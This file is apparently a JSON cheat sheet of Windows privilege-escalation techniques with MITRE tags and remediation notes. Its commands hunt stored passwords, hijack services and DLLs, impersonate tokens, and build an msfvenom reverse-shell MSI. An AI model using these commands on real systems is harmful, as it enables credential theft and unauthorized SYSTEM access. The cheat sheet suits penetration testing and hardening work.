@@ -1,0 +1,158 @@
+[
+  {
+    "id": "cf31a28a-6379-450f-aef6-814bfb2f9f1f",
+    "label": "Host & OS Enumeration",
+    "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"\nwmic qfe get Caption,Description,HotFixID,InstalledOn\nset\nhostname\nver",
+    "description": "<p><strong>Details:</strong> Gather foundational information about the operating system, architecture, environment variables, and applied patch levels (hotfixes) to identify applicable kernel exploits.</p><p><strong>Category:</strong> Enumeration</p><p><strong>Impact:</strong> Reconnaissance</p><p><strong>Remediation:</strong> Apply latest MSRC security patches and restrict wmic access where appropriate.</p>",
+    "tags": [
+      "enum",
+      "systeminfo",
+      "patches",
+      "wmic",
+      "T1082"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "e10cfb3f-1d38-4e94-aea2-33783a0058e5",
+    "label": "User & Privilege Enumeration",
+    "command": "whoami /all\nnet user\nnet localgroup administrators\nnet user %username%",
+    "description": "<p><strong>Details:</strong> Identify the current user's security context, group memberships, and assigned privileges. Look for dangerous privileges like SeImpersonatePrivilege, SeBackupPrivilege, or SeRestorePrivilege.</p><p><strong>Category:</strong> Enumeration</p><p><strong>Impact:</strong> Reconnaissance</p><p><strong>Remediation:</strong> Implement Principle of Least Privilege. Remove unnecessary privileges (e.g., SeImpersonatePrivilege) from service accounts.</p>",
+    "tags": [
+      "whoami",
+      "privileges",
+      "groups",
+      "tokens",
+      "T1033",
+      "T1087.001"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "b2bc983d-71b5-4b31-bdac-817ab55fbcf8",
+    "label": "Network & Connection Enumeration",
+    "command": "netstat -ano\nroute print\narp -A\nipconfig /all",
+    "description": "<p><strong>Details:</strong> Enumerate active network connections, listening ports, routing tables, and ARP caching to understand the host's position within the network and discover internal services bound only to localhost.</p><p><strong>Category:</strong> Enumeration</p><p><strong>Impact:</strong> Reconnaissance</p><p><strong>Remediation:</strong> Use Windows Firewall to restrict inbound/outbound traffic and limit local port binding.</p>",
+    "tags": [
+      "netstat",
+      "network",
+      "arp",
+      "route",
+      "T1049",
+      "T1016"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "98e3b4a2-f617-4835-baa5-cf1f09eaf6be",
+    "label": "Hunt for Cleartext Passwords",
+    "command": "findstr /si password *.txt *.xml *.ini *.config\ncmdkey /list\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" /v DefaultPassword\ntype C:\\Windows\\Panther\\Unattend.xml\ntype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt",
+    "description": "<p><strong>Details:</strong> Search the filesystem, registry, credential manager, untended install files, and PowerShell history files for plaintext passwords or stored credentials.</p><p><strong>Category:</strong> Credential Access</p><p><strong>Impact:</strong> High</p><p><strong>Remediation:</strong> Avoid storing plaintext credentials in scripts, config files, or the registry. Utilize DPAPI, secure credential vaults, and clear PowerShell history.</p>",
+    "tags": [
+      "passwords",
+      "cleartext",
+      "cmdkey",
+      "unattend",
+      "pshistory",
+      "T1552.001",
+      "T1552.002",
+      "T1056.004"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "1d2a5cf3-94c6-430c-ab4e-128a1c97f48b",
+    "label": "Service & Permissions Enumeration",
+    "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"\naccesschk.exe -uwcqv \"Authenticated Users\" *\nGet-CimInstance win32_service | Select Name, State, PathName | Where-Object {$_.State -like \"Running\"}",
+    "description": "<p><strong>Details:</strong> Identify all running services, particularly auto-starting services outside the default Windows directories. Utilize Sysinternals accesschk (if available) to find services with weak configurations or writable executable paths.</p><p><strong>Category:</strong> Enumeration</p><p><strong>Impact:</strong> Reconnaissance</p><p><strong>Remediation:</strong> Ensure strict DACLs on all service configuration registry keys and physical executable files.</p>",
+    "tags": [
+      "services",
+      "wmic",
+      "accesschk",
+      "permissions",
+      "T1007",
+      "T1068"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "19d08ecf-75a7-4b71-98ac-f06b9b1e9af3",
+    "label": "Scheduled Tasks Enumeration",
+    "command": "schtasks /query /fo LIST /v | findstr /i \"TaskToRun\"\nGet-ScheduledTask | where {$_.TaskPath -notlike \"\\Microsoft*\"} | Select TaskName,TaskPath,State",
+    "description": "<p><strong>Details:</strong> Enumerate custom scheduled tasks to identify scripts or binaries executed repetitively by higher-privileged accounts (like SYSTEM or Administrator) that might be writable.</p><p><strong>Category:</strong> Enumeration</p><p><strong>Impact:</strong> Reconnaissance</p><p><strong>Remediation:</strong> Lock down file permissions on scripts and binaries executed via Scheduled Tasks to prevent unprivileged modification.</p>",
+    "tags": [
+      "schtasks",
+      "persistence",
+      "scheduled-tasks",
+      "T1053.005"
+    ],
+    "color": "#ef4444",
+    "hasGraph": false
+  },
+  {
+    "id": "a23f10c8-4712-4eb9-bb23-95ca1d0d5924",
+    "label": "Unquoted Service Path Hijacking",
+    "command": "wmic service get name,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /v \"\\\"\"\nicacls \"C:\\Program Files\\Vulnerable App\\\" \ncopy /y evil.exe \"C:\\Program Files\\Vulnerable App\\Common.exe\"\nsc stop VulnService && sc start VulnService",
+    "description": "<p><strong>Details:</strong> Exploit services configured without quotation marks around their executable paths that contain spaces. An attacker can place a malicious executable (e.g., Common.exe) in a writable directory higher up the path, intercepting the service execution and running as SYSTEM.</p><p><strong>Category:</strong> Privilege Escalation</p><p><strong>Impact:</strong> SYSTEM Access</p><p><strong>Remediation:</strong> Enclose all service executable paths in quotation marks within the registry.</p>",
+    "tags": [
+      "services",
+      "unquoted-path",
+      "hijacking",
+      "SYSTEM",
+      "T1574.009"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "fde12b39-2a91-45cd-a937-299f2b3e8c33",
+    "label": "AlwaysInstallElevated Abuse",
+    "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f msi -o malicious.msi\nmsiexec /quiet /qn /i malicious.msi",
+    "description": "<p><strong>Details:</strong> If the AlwaysInstallElevated group policy is enabled in both HKCU and HKLM, unprivileged users can install .msi files with NT AUTHORITY\\SYSTEM privileges. Attackers build a payload-wrapped MSI and execute it silently.</p><p><strong>Category:</strong> Privilege Escalation</p><p><strong>Impact:</strong> SYSTEM Access</p><p><strong>Remediation:</strong> Disable the AlwaysInstallElevated group policy to prevent unprivileged users from installing software with elevated rights.</p>",
+    "tags": [
+      "alwaysinstallelevated",
+      "msiexec",
+      "registry",
+      "SYSTEM",
+      "T1548.002"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "7b41e8c9-5a11-4f93-b2f5-b6ca98f0ea2d",
+    "label": "DLL Hijacking (Missing DLLs)",
+    "command": "ProcessMonitor.exe /BackingFile \"procmon.pml\"\n# Filter: Result is \"NAME NOT FOUND\", Path ends with \".dll\"\nicacls \"C:\\Vulnerable\\Path\"\nx86_64-w64-mingw32-gcc payload.c -shared -o MissingDLL.dll\ncopy payload.dll \"C:\\Vulnerable\\Path\\MissingDLL.dll\"",
+    "description": "<p><strong>Details:</strong> Identify privileged applications attempting to load non-existent DLLs. If the attacker has write access to any directory in the system PATH before the intended location, they can inject a malicious DLL that will be executed in the context of the vulnerable application.</p><p><strong>Category:</strong> Privilege Escalation</p><p><strong>Impact:</strong> SYSTEM Access</p><p><strong>Remediation:</strong> Ensure applications use absolute paths when loading DLLs and enforce strict directory permissions on all folders in the system PATH.</p>",
+    "tags": [
+      "dll-hijacking",
+      "procmon",
+      "injection",
+      "SYSTEM",
+      "T1574.001"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  },
+  {
+    "id": "45c39126-78b4-4e2b-b5d1-ab51203697e8",
+    "label": "Token Impersonation (PrintSpoofer / Potatoes)",
+    "command": "whoami /priv | findstr \"SeImpersonatePrivilege\"\nPrintSpoofer64.exe -i -c cmd.exe\nJuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c net localgroup administrators attacker /add\" -t *",
+    "description": "<p><strong>Details:</strong> Service accounts (e.g., IIS or MSSQL) often hold SeImpersonatePrivilege. Utilities like PrintSpoofer (exploiting the Spooler service) or RoguePotato (exploiting DCOM) coerce the SYSTEM account to authenticate to an attacker-controlled named pipe, allowing theft of the SYSTEM token.</p><p><strong>Category:</strong> Privilege Escalation</p><p><strong>Impact:</strong> SYSTEM Access</p><p><strong>Remediation:</strong> Disable the Spooler service on domain controllers and sensitive servers. Remove SeImpersonatePrivilege from service accounts when not strictly required.</p>",
+    "tags": [
+      "tokens",
+      "seimpersonate",
+      "printspoofer",
+      "juicypotato",
+      "SYSTEM",
+      "T1134.001"
+    ],
+    "color": "#ef4444",
+    "hasGraph": true
+  }
+]
